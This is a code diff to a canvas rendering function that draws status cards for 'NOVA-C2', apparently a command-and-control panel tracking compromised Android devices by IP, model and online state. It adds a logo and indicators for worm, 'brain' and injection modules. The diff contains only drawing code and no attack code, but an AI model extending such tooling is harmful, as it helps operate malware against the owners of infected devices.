@@ -130,11 +130,27 @@ function truncate(ctx, text, max) {
   return text.slice(0, lo) + '...'
 }
 
+function drawNovaLogo(ctx, x, y, size, theme) {
+  ctx.save()
+  const orig = ctx.textAlign
+  ctx.textAlign = 'right'
+  ctx.font = `bold ${size}px Arial`
+  ctx.fillStyle = theme.accent
+  ctx.shadowColor = theme.glow
+  ctx.shadowBlur = 15
+  ctx.fillText('NOVA', x, y)
+  ctx.shadowBlur = 8
+  ctx.fillStyle = theme.text
+  ctx.fillText('-C2', x + ctx.measureText('NOVA').width, y)
+  ctx.restore()
+}
+
 export async function statusCard(opts = {}) {
   const {
     deviceName = 'Unknown', status = 'offline',
     model = '?', android = '?', ip = '?',
-    lastSeen = 'never', theme = 'blood'
+    lastSeen = 'never', theme = 'blood',
+    wormActive = false, brainActive = false, injectCount = 0
   } = opts
   const w = 700, h = 200
   const canvas = createCanvas(w, h)
@@ -147,6 +163,7 @@ export async function statusCard(opts = {}) {
   drawVisualizer(ctx, w, h, t, isOnline)
   drawGlowLine(ctx, w, h, t)
 
+  // Status badge
   ctx.save()
   ctx.fillStyle = isOnline ? '#10B981' : '#EF4444'
   ctx.shadowColor = isOnline ? '#10B981' : '#EF4444'
@@ -161,6 +178,10 @@ export async function statusCard(opts = {}) {
   ctx.fillText(isOnline ? '● ALIVE' : '● DEAD', 75, 49)
   ctx.restore()
 
+  // NOVA-C2 logo (top right)
+  drawNovaLogo(ctx, w - 30, 49, 16, t)
+
+  // Device name
   ctx.save()
   ctx.fillStyle = t.text
   ctx.font = 'bold 26px Arial'
@@ -171,6 +192,7 @@ export async function statusCard(opts = {}) {
   ctx.fillText(truncate(ctx, deviceName, 350), 30, 72)
   ctx.restore()
 
+  // Model
   ctx.save()
   ctx.fillStyle = t.textSec
   ctx.font = '16px Arial'
@@ -178,17 +200,38 @@ export async function statusCard(opts = {}) {
   ctx.fillText(`Model: ${model}`, 30, 106)
   ctx.restore()
 
+  // Info line
   ctx.save()
   ctx.fillStyle = t.textMuted
   ctx.font = '13px Arial'
   ctx.fillText(`IP: ${ip}   ·   Android: ${android}   ·   Last: ${lastSeen}`, 30, 132)
   ctx.restore()
 
+  // Module indicators
+  ctx.save()
+  ctx.font = '12px Arial'
+  ctx.textAlign = 'right'
+  const modY = 106
+  if (wormActive) {
+    ctx.fillStyle = '#00ff41'
+    ctx.fillText('[WORM]', w - 200, modY)
+  }
+  if (brainActive) {
+    ctx.fillStyle = '#00ccff'
+    ctx.fillText('[BRAIN]', w - 140, modY)
+  }
+  if (injectCount > 0) {
+    ctx.fillStyle = '#ff4444'
+    ctx.fillText(`[INJECT x${injectCount}]`, w - 80, modY)
+  }
+  ctx.restore()
+
+  // Bottom version
   ctx.save()
   ctx.fillStyle = t.accent + '15'
   ctx.font = 'bold 12px Arial'
   ctx.textAlign = 'right'
-  ctx.fillText('NOVA-C2', w - 30, h - 15)
+  ctx.fillText('NOVA-C2 v3.1', w - 30, h - 15)
   ctx.restore()
 
   return canvas.toBuffer('image/png')
